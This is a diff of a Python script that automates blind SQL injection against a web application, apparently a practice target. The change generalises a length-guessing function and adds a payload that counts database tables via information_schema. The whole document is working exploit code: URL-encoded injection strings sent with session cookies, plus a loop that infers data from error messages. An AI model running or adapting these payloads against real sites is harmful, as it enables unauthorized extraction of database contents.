@@ -21,17 +21,17 @@ def sql_inject(sqli_pt1, variable, sqli_pt2):
     return requests.get(next_url, cookies=cookies)
 
 
-def guess_db_len():
-    # Guess DB name (strlen)
+def guess_len(guess_type, sqli_pt1, sqli_pt2):
+    # Guess length of DB name, table count etc
     for i in range(1, 100):
         # Submit SQLi string
-        response = sql_inject("'+and+length(database())+%3D", str(i), "+%23")
+        response = sql_inject(sqli_pt1, str(i), sqli_pt2)
         # Extract the response we're interested in
         error_message = re.search(r'User.*\.', response.text).group(0)
         print(error_message, end='\n\n')
         # If we've found the DB name length, return
         if "MISSING" not in error_message:
-            print("DB Name Length: " + str(i), end='\n\n')
+            print(guess_type + str(i), end='\n\n')
             return i
 
 
@@ -81,8 +81,13 @@ def guess_db_name(db_name_len):
     return db_name
 
 
-# Get the length of DB name first
-db_name_len = guess_db_len()
+# Get the length of DB name first (pass in print output + SQLi pt1/pt2)
+db_name_len = guess_len("DB Name Length: ", "'+and+length(database())+%3D", "+%23")
 
 # Get the DB name
 db_name = guess_db_name(db_name_len)
+
+# Get number of tables in the DB
+db_table_count = guess_len(
+    "DB Table Count: ",
+    "'+and+(select+count+(table_name)+from+information_schema.tables+where+table_schema%3Ddatabase())%3D", "")
